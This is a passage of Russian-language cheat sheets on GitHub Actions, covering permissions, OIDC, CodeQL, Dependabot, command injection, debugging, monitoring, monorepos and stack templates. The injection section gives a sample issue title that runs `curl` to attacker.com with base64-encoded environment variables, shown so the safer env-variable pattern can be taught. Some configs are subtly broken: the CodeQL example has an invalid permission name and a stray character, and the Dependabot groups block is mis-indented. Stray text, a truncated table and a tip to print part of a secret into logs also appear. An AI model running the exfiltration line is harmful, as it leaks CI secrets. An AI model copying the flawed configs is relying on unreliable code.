**Как это работает:** Как только ты добавляешь блок `permissions:` в свой YAML-файл (будь то уровень workflow или job), **все остальные права, которые не указаны явно, автоматически сбрасываются в `none`**.

*Пример ошибки:* Ты решил добавить право на `pull-requests: write`, но забыл про `contents: read`. В итоге `actions/checkout` упадет с ошибкой "Permission Denied", потому что доступ к коду был аннулирован.

---

### ❓ FAQ (Частые вопросы)

**В: Что будет, если я вообще не напишу блок `permissions` в YAML?**
**О:** GitHub применит настройки по умолчанию из настроек твоего репозитория (Settings -> Actions -> General). Обычно это либо `Read/Write`, либо `Read-only`. Но полагаться на это — плохой тон. Всегда описывай права явно.

**В: Почему мой `actions/checkout` выдает ошибку доступа, хотя я ничего не менял?**
**О:** Скорее всего, ты добавил в этот workflow новый блок `permissions:` для какой-то другой задачи (например, для комментирования PR) и забыл явно прописать `contents: read`.

**В: Можно ли использовать `GITHUB_TOKEN` для доступа к другому репозиторию?**
**О:** Нет. `GITHUB_TOKEN` ограничен только текущим репозиторием. Для доступа к другим репозиториям нужно использовать **GitHub App** или **Personal Access Token (PAT)**, сохраненный в Secrets.

**В: Безопасно ли использовать `contents: write` для всего workflow?**
**О:** В маленьком личном проекте — допустимо. В энтерпрайзе — это нарушение безопасности. Если злоумышленник найдет уязвимость в одном из используемых тобой Action (через `uses:`), он сможет запушить вредоносный код прямо в твою основную ветку.

# 🔐 Шпаргалка: OIDC (OpenID Connect) в GitHub Actions

### 💡 Суть простыми словами
Раньше, чтобы GitHub мог задеплоить код в AWS/GCP/Azure, нам приходилось создавать **долгоживущий секрет** (Access Key + Secret Key) и хранить его в GitHub Secrets. Если этот ключ утекал — злоумышленник получал доступ к твоей инфраструктуре навсегда (пока ты не сменишь ключ).

**OIDC** — это способ сказать облачному провайдеру: *"Я — GitHub, вот мой цифровой паспорт (токен). Я не прошу у тебя пароль, просто проверь мою подпись и пусти меня в облако на 5 минут"*. 
**Никаких паролей в секретах. Только временные, короткоживущие токены.**

---

### ⚙️ Как это работает (Механика)
Процесс строится на обмене доверием между тремя участниками: **GitHub**, **Workflow** и **Cloud Provider**.

1.  **Генерация:** Когда запускается Workflow, GitHub создает временный JWT-токен (JSON Web Token).
2.  **Запрос:** Workflow отправляет этот токен в облачный провайдер (например, AWS).
3.  **Проверка (Trust):** Облачный провайдер смотрит на подпись токена. Он заранее знает публичные ключи GitHub и может проверить: *"Да, это действительно пришло от GitHub"*.
4.  **Анализ Claims (Утверждений):** Провайдер заглядывает внутрь токена и проверяет **Claims** (например: *"Пришел запрос из репозитория `my-org/my-repo` из ветки `main`"*). Если условия совпадают с настроенной ролью — доступ разрешен.
5.  **Выдача:** Облако выдает временные учетные данные (STS в AWS), которые действуют только во время работы этого конкретного Job.

---

### 🛠 Ключевые компоненты (Что нужно настроить)

#### 1. На стороне GitHub (Workflow YAML)
Самое важное — дать Workflow право «выписывать» себе этот паспорт.
```yaml
permissions:
  id-token: write # ОБЯЗАТЕЛЬНО: позволяет экшену запрашивать JWT токен
  contents: read  # Обычное разрешение на чтение кода
```

#### 2. На стороне Cloud Provider (Identity Provider)
Нужно создать **OIDC Identity Provider**. В нем указываются:
*   **Issuer URL:** `https://token.actions.githubusercontent.com`
*   **Audience:** Обычно это ID твоего облака или специфический URI.

#### 3. Настройка Trust Policy (Самый важный нюанс!)
Ты создаешь IAM-роль, но в её «политике доверия» прописываешь условия (**Condition**). Ты не просто говоришь *"Верь GitHub"*, ты говоришь: *"Верь только если это репозиторий `my-org/app` и ветка `main`"*.

---

### ⚠️ Нюансы и "Подводные камни" (Senior Level)

1.  **Принцип наименьших привилегий (Least Privilege):**
    *   ❌ **Плохо:** Разрешить доступ любому репозиторию твоей организации (`repo:my-org/*`). Если кто-то создаст тестовый репозиторий в вашей org, он сможет украсть доступ к продакшену.
    *   ✅ **Хорошо:** Четко ограничивать `sub` (subject) конкретным репозиторием и веткой (`repo:my-org/my-app:ref:refs/heads/main`).

2.  **Забытый permission:**
    Если ты не прописал `id-token: write`, шаг аутентификации упадет с ошибкой, так как GitHub просто не выдаст токен для обмена.

3.  **Проблема "Wildcards" (Звездочки):**
    Использование `*` в условиях проверки — это огромная дыра в безопасности. Всегда старайся максимально сузить область действия роли.

4.  **Audience (aud) mismatch:**
    Если в настройках Identity Provider указан один Audience, а экшен пытается отправить другой — аутентификация не пройдет. Они должны совпадать идеально.

---

### ❓ FAQ (Частые вопросы)

**В: Нужно ли мне всё еще хранить AWS_ACCESS_KEY_ID в секретах?**
**О:** Нет. При использовании OIDC тебе больше не нужны долгоживущие ключи доступа. Единственное, что может остаться — это `Role ARN` (это не секрет, это просто адрес роли), но он не дает доступа без валидного токена от GitHub.

**В: Насколько безопаснее OIDC по сравнению с обычными секретами?**
**О:** Намного. В случае утечки секрета в логах или через кражу конфигов, старый ключ дает доступ навсегда. При утечке OIDC-токена, он бесполезен вне контекста конкретного запуска GitHub Actions и живет очень недолго.

**В: Можно ли использовать один OIDC провайдер для разных облаков?**
**О:** Да, но технически это будут разные настройки Identity Provider в каждом облаке (AWS, GCP, Azure), хотя принцип работы везде идентичен.

**В: Что такое "Claims" в контексте OIDC?**
**О:** Это метаданные внутри JWT-токена. В них зашита информация о том, кто отправил запрос: какой репозиторий, какая ветка, какой PR, какой пользователь запустил процесс. Именно на эти данные мы опираемся для безопасности.

# 🛡️ Шпаргалка: Code Scanning & Dependabot

В мире современной разработки мы используем принцип **"Shift Left"** — это значит, что мы находим ошибки и уязвимости как можно раньше (на этапе написания кода), а не когда всё уже упало на продакшене. Code Scanning и Dependabot — это два столпа безопасности в GitHub.

---

## 🔍 1. Code Scanning (Анализ кода)
**Суть:** Это инструмент для поиска уязвимостей внутри *твоего* собственного кода (логические ошибки, SQL-инъекции, XSS и т.д.). Основной движок здесь — **CodeQL**.

### Как это работает:
1.  **Анализ:** GitHub не просто ищет текст по регуляркам, он строит граф потоков данных (Data Flow Analysis). Он понимает, что переменная из `user_input` попала в `db_query` без очистки.
2.  **Триггер:** Обычно запускается как часть GitHub Actions при каждом `push` или `pull_request`.
3.  **Результат:** Ты видишь алерты прямо в интерфейсе PR (Pull Request).

### Ключевые нюансы:
*   **CodeQL Queries:** Это набор правил. Если ты пишешь на экзотическом языке, стандартных правил может не хватить.
*   **SARIF Format:** Результаты сканирования сохраняются в формате `.sarif`. Это стандарт, который позволяет передавать отчеты в другие системы (например, в SonarQube).
*   **Стоимость (Важно!):** Для публичных репозиториев это **бесплатно**. Для приватных — требуется подписка **GitHub Advanced Security (GHAS)**. Это часто становится камнем претновения при планировании бюджета.

### Пример конфига (`.github/workflows/codeql.yml`):
```yaml
name: "CodeQL"
on: [push, pull_request]
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-review: write # Нужно для записи алертов
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      # Инициализация CodeQL (создание базы данных кода)
      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
s       languages: 'javascript' # Указываем язык
      # Автоматический запуск анализа
      - name: Perform Analysis
        uses: github/codeql-action/analyze@v3
```

## 📦 2. Dependabot (Управление зависимостями)
**Суть:** Если Code Scanning проверяет *твой* код, то Dependabot проверяет *чужой* код (библиотеки), который ты используешь. Он следит за тем, чтобы твои `npm packages`, `pip requirements` или `go.mod` не содержали известных дыр в безопасности.

### Три составляющие Dependabot:
1.  **Dependency Graph:** "Карта" твоего проекта. GitHub сканирует файлы манифестов и понимает, от чего ты зависишь (включая транзитивные зависимости — те, что зависят от твоих зависимостей).
2.  **Security Alerts:** Уведомления. Если в библиотеке `lodash` нашли критическую уязвимость, Dependabot пришлет алерт.
3.  **Version Updates:** Автоматизация рутины. Он сам создает Pull Request, когда выходит новая версия библиотеки.

### Ключевые нюансы:
*   **Шум (Noise Management):** Если включить авто-обновление всего подряд, ты утонешь в сотнях PR. **Senior Tip:** Используй группировку обновлений.
*   **Конфигурация:** Всё настраивается через файл `.github/dependabot.yml`.

### Пример конфига (`.github/dependabot.yml`):
```yaml
version: 2
updates:
  # Настройка для npm (Node.js)
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly" # Проверять раз в неделю, чтобы не спамить PR
    groups:
      # Группируем все обновления dev-зависимостей в один PR
    dependencies:
      patterns:
        - "dev-*" 
```

# 🛡️ Защита от инъекций в YAML (Command Injection)

### 💡 Суть проблемы
В GitHub Actions самая большая дыра в безопасности — это использование **неконтролируемых данных** (из названий Pull Request, комментариев к Issue или полей `workflow_dispatch`) напрямую внутри блока `run`.

Если ты вставляешь контекст `${{ ... }}` прямо в строку команды, злоумышленник может дописать к своим данным спецсимволы (`;`, `&`, `|`, `` ` ``, `$()`), которые заставят твой Runner выполнить произвольный вредоносный код.

---

### ❌ Как делать НЕЛЬЗЯ (Vulnerable Code)
Представь, что у тебя есть workflow, который пишет в лог название Issue:

```yaml
jobs:
  bad-job:
    runs-on: ubuntu-latest
    steps:
      - name: Print issue title
        # ОПАСНО! Злоумышленник может подставить спецсимволы в заголовок Issue
        run: echo "Processing issue: ${{ github.event.issue.title }}"
```

**Сценарий атаки:**
Злоумышленник создает Issue с заголовком: 
`"My issue"; curl http://attacker.com/$(env | base64); #`

**Что увидит Runner:**
Вместо одной команды `echo`, он выполнит две:
1. `echo "Processing issue: My issue"` (нормально)
2. `curl http://attacker.com/...` (**БАХ! Твои секреты и переменные среды улетели хакеру**)
3. `#` — комментарий, который «съест» оставшуюся часть команды, чтобы не было синтаксической ошибки.

---

### ✅ Как делать ПРАВИЛЬНО (Secure Code)

#### Способ №1: Использование Environment Variables (Золотой стандарт) 🏆
Это самый надежный метод. Мы сначала передаем данные из контекста GitHub в переменную окружения (`env`), а затем обращаемся к ней как к обычной переменной оболочки (shell variable).

```yaml
jobs:
  good-job:
    runs-on: ubuntu-latest
    steps:
      - name: Print issue title safely
        env:
          # Мы помещаем данные в ENV до того, как они попадут в shell-команду
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
          # Теперь мы используем переменную оболочки $ISSUE_TITLE
          # Shell воспримет её содержимое просто как строку, а не как часть команды
          echo "Processing issue: $ISSUE_TITLE"
```
**Почему это работает:** Когда данные находятся в `env`, GitHub Actions передает их в процесс Runner'а как часть окружения. Shell (bash/pwsh) воспринимает значение `$ISSUE_TITLE` как единый литерал, даже если там есть `;` или `&`.

#### Способ №2: Маппинг через замену (Для сложных случаев)
Если тебе всё же нужно использовать данные в логике самого YAML, старайся пропускать их через фильтры или сопоставлять с разрешенным списком (allow-list). Но для 99% задач способа с `env` достаточно.

---

### ⚠️ Нюансы от Senior-а

1.  **Не доверяй `workflow_dispatch`:** Многие думают: "Я сам запускаю этот workflow, значит, ввод безопасен". Это ошибка. Если твой workflow используют другие люди или он вызывается через API, входные параметры (`inputs`) — это такой же вектор атаки.
2.  **Скрытая опасность в `uses`:** Будь осторожен при использовании динамических путей в `uses`. Хотя это сложнее реализовать, манипуляция версиями экшенов может привести к подмене кода.
3.  **Логирование секретов:** Даже если ты защитил выполнение команды, помни: если ты выведешь `$ISSUE_TITLE` через `echo`, и в заголовке была попытка украсть секрет, сам заголовок все равно попадет в логи. Всегда проверяй, что именно попадает в `stdout`.

---

### ❓ FAQ (Часто задаваемые вопросы)

**В: Можно ли просто обернуть контекст в кавычки, например `echo "${{ github.event.issue.title }}"`?**
**О:** **Нет!** Это не защитит тебя. Злоумышленник может использовать символ обратной кавычки (`` ` ``) или конструкцию `$(...)`, чтобы выйти за пределы твоих кавычек и выполнить код. Только `env` дает реальную изоляцию.

**В: А если я использую Python или Node.js в шаге `run`?**
**О:** Принцип тот же. Не делай так: `run: python script.py --title "${{ github.event.issue.title }}"`. Делай так: передавай через `env`, а внутри скрипта читай из `os.environ`.

**В: Влияет ли это на скорость работы?**
**О:** Практически нет. Накладные расходы на создание переменной окружения ничтожны по сравнению с риском полной компрометации репозитория.

# 🔍 Тема: Анализ логов (Log Analysis)

Логи в GitHub Actions — это твой единственный источник истины. Если workflow упал, логи — это «черный ящик» самолета, который расскажет, что именно пошло не так.

### 📍 Где искать?
1. Перейди во вкладку **Actions** в репозитории.
2. Выбери конкретный запуск (**Workflow run**) из списка.
3. В левой панели выбери нужную **Job** (задание).
4. Разверни конкретный **Step** (шаг), чтобы увидеть детали.

### 🛠 Инструменты отладки (Debugging Toolbox)

Когда стандартного вывода недостаточно, используй эти приемы:

1.  **Режим расширенного логирования (`ACTIONS_STEP_DEBUG`)**:
    Самый мощный инструмент. Если включить эту переменную окружения, GitHub начнет выводить детальную информацию о работе внутренних экшенов (например, что именно делает `actions/checkout`).
    *   *Как включить:* В настройках репозитория (**Settings -> Secrets and variables -> Actions**) добавь секрет `ACTIONS_STEP_DEBUG` со значением `true`.

2.  **Группировка логов (`::group::` и `::endgroup::`)**:
    Если твой шаг выводит сотни строк (например, тесты), логи превращаются в кашу. Используй специальные команды Workflow, чтобы схлопнуть вывод в раскрывающийся список.
    ```bash
    echo "::group::Detailed Test Results"
    npm test
    echo "::endgroup::"
    ```

3.  **Проверка окружения**:
    Часто ошибка не в коде, а в том, что переменная `PATH` или версия `Node.js` не те. Всегда полезно добавить шаг для вывода критичных переменных (но **никогда** не выводи секреты!).
    ```yaml
    - run: env | grep NODE_VERSION
    ```

### ⚠️ Нюансы и «подводные камни» (Senior Tips)

*   **Маскировка секретов (`***`)**: GitHub автоматически скрывает значения всех переменных, которые помечены как `Secrets`. Если ты видишь в логах `***`, это не ошибка — это защита. Если тебе нужно проверить, дошло ли значение до шага, используй `echo "${{ secrets.MY_VAR }}" | cut -c 1-3` (выведи только первые 3 символа).
*   **Stdout vs Stderr**: Помни, что многие инструменты пишут ошибки в `stderr`. Если ты перенаправляешь вывод (`> file.txt`), ошибки могут не попасть в файл. Всегда проверяй оба потока.
*   **Log Retention (Срок хранения)**: Логи не вечны. По умолчанию GitHub хранит их 90 дней. Если тебе нужно сохранить отчеты о тестах надолго, используй **Artifacts**.
*   **Размер лога**: Слишком раздутые логи могут замедлить загрузку страницы в браузере. Старайся использовать `grep` или фильтрацию прямо внутри шага, чтобы не забивать интерфейс мусором.

# 🛠 Debug Logging в GitHub Actions

**Debug Logging** — это твой «фонарик» в темной комнате. По умолчанию GitHub Actions показывает только высокоуровневые логи: что запустилось, что упало и какой статус выполнения. Если шаг (step) прошел, но результат не тот, который ты ожидал, тебе нужно включить режим отладки, чтобы увидеть детализацию внутренних процессов самого экшена или скрипта.

### 🚀 Как это включить?

Есть два основных уровня «глубины» отладки.

#### 1. Уровень Step/Action (`ACTIONS_STEP_DEBUG`)
Это самый популярный способ. Он заставляет GitHub выводить расширенную информацию о работе каждого шага и используемых `uses: actions/...` экшенах.

**Как активировать (3 способа):**

*   **Способ А: Через Variables репозитория (Рекомендуемый)** 🌟
    Зайди в *Settings -> Secrets and variables -> Actions -> Variables*. Создай переменную `ACTIONS_STEP_DEBUG` со значением `true`.
    *Почему это круто:* Не нужно менять код YAML. Включил — проверил — выключил. Это работает для **всех** будущих запусков.
*   **Способ Б: На уровне Workflow (Временный)**
    Пропиши в `env` конкретного workflow:
    ```yaml
    env:
      ACTIONS_STEP_DEBUG: true
    ```
*   **Способ В: Через секреты (Для безопасности)**
    Если ты хочешь, чтобы дебаг включался только при определенных условиях, можно использовать секрет, но это менее удобно для быстрого переключения.

#### 2. Уровень Runner (`ACTIONS_RUNNER_DEBUG`)
Это «ядерный вариант». Он включает логирование самого процесса раннера (агента), который управляет выполнением.
*   **Зачем:** Когда проблема не в твоем коде, а в том, что сам GitHub Runner ведет себя странно (проблемы с сетью, файловой системой или установкой софта).
*   те же методы активации (Variables/Secrets), но переменная называется `ACTIONS_RUNNER_DEBUG = true`.
*   **Осторожно:** Логи станут гигантскими. Читать их практически невозможно без специальных инструментов.

### ⚠️ Нюансы и Senior-советы (Pro Tips)

1.  **Безопасность (Security First):** GitHub автоматически маскирует секреты (`***`), даже в дебаг-логах. Однако, при чрезмерном логировании ты можешь случайно «засветить» структуру своих переменных или метаданные, которые не должны быть публичными. **Никогда не включай глобальный дебаг на постоянной основе в публичных репозиториях.**
2.  **Засорение логов (Log Noise):** Включение `ACTIONS_STEP_DEBUG` генерирует ОГРОМНОЕ количество текста. Если твой workflow и так длинный, найти нужную ошибку станет слотнее из-за «информационного шума».
3.  **Стоимость и хранение:** Хотя GitHub не берет деньги за объем логов напрямую, слишком раздутые логи могут замедлять загрузку страницы в браузере и затруднять работу команды.
4.  **Scope (Область видимости):** Помни, что переменная, добавленная в *Repository Variables*, влияет на **все** workflow в этом репозитории. Если ты забудешь её выключить, дебаг будет работать вечно.

# 📊 Тема: Интеграция с внешними системами мониторинга

Когда мы говорим о мониторинге GitHub Actions, мы имеем в виду не «слежку за сервером», а **Observability (наблюдаемость) пайплайнов**. Нам нужно понимать: наши тесты стали идти дольше? Стало ли больше падений? Не слишком ли много мы тратим денег на минуты раннеров?

### 🎯 Что именно мы мониторим? (Метрики)
1.  **Success/Failure Rate:** Процент успешных запусков. Резкое падение — признак проблем в коде или инфраструктуре.
2.   **Duration (Latency):** Время выполнения Jobs и Steps. Рост времени — сигнал о «раздувании» тестов или проблемах с сетью.
3.  **Flakiness (Нестабильность):** Частота, когда один и тот же коммит падает, а потом проходит без изменений. Это «тихий убийца» продуктивности.
4.  **Cost/Usage:** Количество использованных минут и типы раннеров. Важно для контроля бюджета.
5.  **Queue Time:** Время ожидания в очереди перед началом выполнения (актуально для Self-hosted runners).

---

### 🛠 Стратегии интеграции

Существует три основных архитектурных подхода к передаче данных из GitHub Actions вовне:

#### 1. Push Model (Активная отправка)
Workflow сам «стучится» в систему мониторинга в конце выполнения или при ошибке.
*   **Как это работает:** В конце workflow стоит Step, который делает `curl` запрос к API (например, Datadog, New Relic или Grafana Cloud).
*   **Плюсы:** Максимальная детализация. Ты можешь отправить кастомный JSON с результатами конкретных тестов.
*   **Минусы:** Если workflow упал до этого шага (и ты не настроил `if: always()`), данные не уйдут.

#### 2. Pull Model (Опрос через API)
Внешняя система периодически опрашивает GitHub API, забирая данные о завершенных запусках.
*   **Как это работает:** Скрипт или сервис (например, Prometheus с специальным экспортером) раз в минуту вызывает [GitHub REST API](https://docs.api.github.com/en/rest), проверяет статус workflow и записывает метрики.
*   **Плюсы:** Не нагружает сам workflow. Безопасно (не нужно прокидывать секреты внутрь экшена). Позволяет строить исторические графики.
*   **Минусы:** Задержка в данных (лаг) и риск упереться в **Rate Limits** (ограничения GitHub по количеству запросов к API).

#### 3. Webhook Model (Событийная модель)
GitHub сам уведомляет внешнюю систему о наступлении события (`workflow_run`, `push` и т.д.).
*   **Как это работает:** Ты настраиваешь Webhooks в настройках репозитория. При завершении workflow GitHub шлет POST-запрос на твой эндпоинт.
*   **Плюсы:** Real-time уведомления. Самый эффективный способ с точки зрения ресурсов.
*   **Минусы:** Требуется наличие публичного URL (или использование прокси/сервисов вроде Smee.io) и инфраструктуры, которая сможет принять и обработать этот вебхук.

---

### 💡 Senior Nuances (Нюансы, о которых забывают)

*   **`if: always()` — твой лучший друг:** При использовании **Push Model**, всегда ставь `if: always()` на шаг отправки метрик. Иначе при падении теста ты не узнаешь, что он упал, так как шаг мониторинга просто не запустится.
*   **Alert Fatigue (Усталость от алертов):** Не пытайся слать уведомление в Slack на каждый чих. Интегрируй метрики в Grafana/Datadog, и настраивай алерты только на *аномалии* (например, "время выполнения выросло на 50% относительно среднего за неделю").
*   **Security & Secrets:** Никогда не передавай токены мониторинга открытым текстом. Используй `secrets.MONITORING_TOKEN`. При использовании Webhooks проверяй подпись (HMAC), чтобы никто не прислал тебе фейковые данные о «падении» билда.
*   **Cost of Observability:** Сбор слишком детальных логов через API может стоить дорого (трафик, хранение в ELK/Splunk). Выбирай баланс между глубиной данных и ценой их хранения.

# 🛠 Шпаргалка: Принципы DRY в GitHub Actions

**Суть:** Любая логика (сборка, тесты, деплой) должна определяться в **одном** месте. Если ты копипастишь блоки `steps` или `jobs` — ты нарушаешь DRY.

### 1. Уровни абстракции (от простого к сложному)

В GitHub Actions есть три способа избежать дублирования, и важно понимать, какой выбрать:

#### А. Matrix Strategy (Уровень: Скрипты)
*   **Когда использовать:** Когда нужно запустить **один и тот же набор шагов**, но с разными параметрами (разные версии языка, разные ОС).
*   **Что дает:** Вместо написания 3-х джоб для Python 3.8, 3.9 и 3.10, ты пишешь одну джобу с матрицей.
*   **Пример:** `strategy: matrix: { os: [ubuntu-latest, windows-latest], python-version: ["3.9", "3.10"] }`.

#### Б. Composite Actions (Уровень: Шаги/Steps)
*   **Когда использовать:** Когда у тебя есть **последовательность шагов**, которая повторяется в разных workflow (например: *установка зависимостей $\rightarrow$ кэширование $\rightarrow$ проверка линтером*).
*   **Что дает:** Ты упаковываешь набор `steps` в один экшен. В основном workflow вместо 10 строк кода ты пишешь одну: `uses: ./.github/actions/setup-and-lint`.
*   **Нюанс:** Composite Actions живут внутри одного репозитория (или другого) и работают на уровне **шагов** внутри одной джобы.

#### В. Reusable Workflows (Уровень: Задания/Jobs)
*   **Когда использовать:** Когда тебе нужно переиспользовать **целые процессы или пайплайны** (например, целый процесс деплоя в разные окружения).
*   **Что дает:** Ты создаешь отдельный YAML-файл с `workflow_call`. Другие workflow могут вызывать его как подпроцесс. Это позволяет передавать целые джобы, артефакты и секреты.
*   **Нюанс:** Это самый мощный инструмент. Он работает на уровне **целых Jobs**.

---

### 2. Золотые правила Senior-инженера

1.  **Не переусложняй (Avoid Over-engineering):** Если логика используется только в одном месте — не делай из неё экшен. Абстракция должна окупаться. Если чтение workflow превращается в квест «найди, где спрятана эта логика», ты проиграл.
2.  **Версионируй свои абстракции:** Если ты выносишь код в Composite Action или Reusable Workflow (особенно если они в другом репозитории), **всегда** используй теги (`uses: my-action@v1`), а не ветку `main`. Иначе обновление экшена может внезапно сломать все твои пайплайны.
3.  **Single Source of Truth (SSOT):** Все переменные (версии, пути, названия окружений) должны быть вынесены в `env` или `inputs`.

### 3. Сводная таблица: Что выбрать?

| Инструмент | Что внутри? | Граница применения | Главная цель |
| :--- | :--- | :--- | :--- |
| **Matrix** | Параметры | Внутри одной Job | Вариативность данных |

### ❓ FAQ (Частые вопросы)

**В: Чем Composite Action отличается от Reusable Workflow?**
**О:** Это самый частый вопрос. Запомни: **Composite — это про шаги (`steps`), а Reusable — это про задания (`jobs`)**. Если тебе нужно просто сгруппировать `npm install` и `npm test` — бери Composite. Если тебе нужно, чтобы после сборки (Job 1) шел деплой (Job 2) с проверкой человеком — бери Reusable.

**В: Как передать секреты в Reusable Workflow, чтобы не писать их вручную в каждом вызове?**
**О:** Используй параметр `secrets: inherit`. Это магическая кнопка, которая пробрасывает все секреты текущего workflow в вызываемый (reusable) workflow автоматически.

**В: Можно ли использовать Composite Action для запуска разных Job?**
**О:** Нет. Composite Action может только выполнять шаги внутри уже запущенной джобы. Он не может создать новую джобу или управлять зависимостями `needs`. Для этого только Reusable Workflows.

# 🏗️ Структура монорепозитория в GitHub Actions

**Монорепозиторий (Monorepo)** — это когда у тебя в одном репозитории лежит много разных проектов: например, `apps/web`, `apps/api`, `libs/shared-ui` и т.д. 

Главная проблема монорепозитория для CI/CD — **"Эффект домино"**. Если ты поправил опечатку в README, зачем нам пересобирать и тестировать все 10 микросервисов? Это дорого, долго и бессмысленно. Наша задача: **изолировать изменения**.

---

### 🎯 Основные стратегии оптимизации

#### 1. Уровень "Junior": Фильтрация по путям (`paths`)
Самый простой способ. Мы говорим GitHub: "Запускай этот workflow, только если изменились файлы в этой папке".

```yaml
on:
  push:
    paths:
      - 'apps/api/**' # Сработает только при изменениях в папке api
      - 'libs/shared-logic/**' # И при изменениях в общей библиотеке
```
*   **Плюс:** Настройка занимает 2 строки.
*   **Минус:** Нельзя реализовать сложную логику (например, "если изменилась библиотека А, нужно запустить тесты и для сервиса Б и В").

#### 2. Уровень "Middle": Использование `dorny/paths-filter`
Когда стандартных `paths` не хватает, мы используем специальный Action, который анализирует изменения и выставляет "флаги" (outputs). Это позволяет внутри одного workflow решать, какие шаги запускать.

**Пример логики:**
1. Считаем изменения через `paths-filter`.
2. Если `api` изменился $\to$ запускаем `build api`.
3. Если `shared-lib` изменился $\to$ запускаем `build api` И `build web`.

#### 3. Уровень "Senior": Reusable Workflows + Matrix
Чтобы не копипастить YAML для каждого сервиса, мы создаем **один универсальный шаблон** (Reusable Workflow) и вызываем его с разными параметрами.

*   **Template:** Один файл `.github/workflows/reusable-build.yml`, который умеет принимать `service_name` и `working_dir`.
*   **Caller:** Основной workflow, который перебирает список сервисов и запускает шаблон.

---

### ⚠️ Нюансы и "Подводные камни" (Senior Advice)

1.  **Зависимости (The Dependency Graph):** Это самая слостая часть. Если у тебя есть `libs/core`, изменение в которой ломает всё, тебе нужно настроить детекцию так, чтобы изменения в `core` триггерили *все* связанные приложения.
2.  erc **Concurrency (Конкурентность):** В монорепозитории часто запускается много джобов одновременно. Используй `concurrency: group: ${{ github.workflow }}-${{ github.ref }}`, чтобы старые запуски одного и того же сервиса отменялись, если пришел новый коммит. Это экономит минуты (и деньги).
3.  **Blast Radius (Радиус поражения):** Всегда старайся минимизировать область влияния изменений. Хороший CI в монорепозитории — это тот, который при коммите в `apps/web` вообще не трогает инфраструктуру и другие приложения.
4.  **Caching:** Используй кэширование с учетом пути. Если ты используешь один глобальный кэш для всех, он может переполниться или вызвать конфликты. Лучше делать ключи кэша зависимыми от `hashFiles('apps/api/package-lock.json')`.

### ❓ FAQ (Частые вопросы)

**В: Что делать, если я изменил общую библиотеку, и мне нужно пересобрать всё?**
**О:** Используй стратегию с `paths-filter`. Настрой его так, чтобы при изменении пути `libs/**` он выдавал `output: true` для всех критичных джобов.

**В: Монорепозиторий — это всегда медленно?**
**О:** Нет. Если настроена правильная фильтрация путей и грамотный кэш, монорепозиторий может работать даже быстрее, чем полирепозиторий, за счет того, что все зависимости под рукой и не нужно ждать внешних fetch-запросов.

**В: Как избежать дублирования кода в YAML?**
**О:** Используй **Reusable Workflows**. Создай один "золотой стандарт" сборки и просто вызывай его из разных триггеров, передавая только `input` (путь к папке, команду запуска).

**В: Как тестировать изменения в `libs`, не запуская тесты всех приложений?**
**О:** Это сложно. В идеале тебе нужно дерево зависимостей. Если это слишком дорого по ресурсам, используй подход "Impact Analysis": анализируй `git diff` и сопоставляй измененные файлы с их потребителями (это требует кастомного скрипта на Python/Bash).

# 🚀 Шпаргалка: Шаблоны для популярных стеков

## 1. Node.js (Frontend / Backend)
Основная задача: обеспечить идентичность `node_modules` между разработчиком и CI.

**Ключевые компоненты:**
*   **Setup:** `actions/setup-node@v4`.
*   **Dependency Install:** Всегда используй **`npm ci`** вместо `npm install`. 
    *   *Нюанс:* `npm ci` удаляет существующую папку и устанавливает строго то, что прописано в `package-lock.json`. Это гарантирует воспроизводимость.
*   **Caching:** Кэшируй `~/.npm` для ускорения.

**Пример структуры (Best Practice):**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm' # Автоматический кэш для npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
```

## 2. Python (Data Science / Backend)
Основная задача: управление окружением и проверка типов/стиля.

**Ключевые компоненты:**
*   **Setup:** `actions/setup-python@v5`.
*   **Dependency Install:** Если используешь `pip`, кэшируй директорию pip. Если `Poetry` — это отдельный уровень сложности (нужно сначала установить Poetry).
*   **Linting/Formatting:** Обязательно включай шаги с `flake8`, `black` или `ruff`.

**Пример структуры (Best Practice):**
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          cache: 'pip' # Кэширует зависимости из requirements.txt
      - run: pip install -r requirements.txt
      - run: pip install ruff # Современный и быстрый линтер
      - run: ruff check .
      - run: pytest
```

## 3. Go (Cloud Native / System)
Основная задача: быстрая компиляция и проверка модулей.

**Ключевые компоненты:**
*   **Setup:** `actions/setup-go@v5`.
*   **Caching:** Кэширование `go mod` — критично для скорости.
*   **Linting:** Использование `golangci-lint` (стандарт индустрии).

**Пример структуры (Best Practice):**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'
          cache: true # Включает кэширование go modules
      - run: go mod download
      - name: golangci-lint
        uses: golangci/golangci-lint-action@v4
      - run: go test -v ./...
      - run: go build -v ./...
```

## 4. Docker (Containerization)
Основная задача: сборка образа и пуш в Registry (Docker Hub, GHCR).

**Ключевые компоненты:**
*   **Setup:** `docker/setup-buildx-action` (для мультиплатформенной сборки).
*   **Login:** `docker/login-action`.
*   **Caching:** Использование `type=gha` кэша (специальный тип кэша для GitHub Actions, который работает быстрее всего).

**Пример структуры (Best Practice):**
```yaml
jobs:
  push_image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: user/app:latest
          cache-from: type=gha # Используем кэш GitHub Actions
          cache-to: type=gha,mode=max
```

## 🧠 Senior Tips (Нюансы)

1.  **Версионирование экшенов:** Никогда не используй `@master` или `@latest`. Всегда указывай конкретную версию (например, `@v4`). Это защитит твой пайплайн от внезапного падения, если разработчик экшена обновил код и сломал совместимость.
2.  **Matrix Strategy:** Если ты пишешь шаблон для библиотеки, используй `strategy: matrix`, чтобы протестировать проект на разных версиях языка (например, Node 18, 20, 22) одновременно.
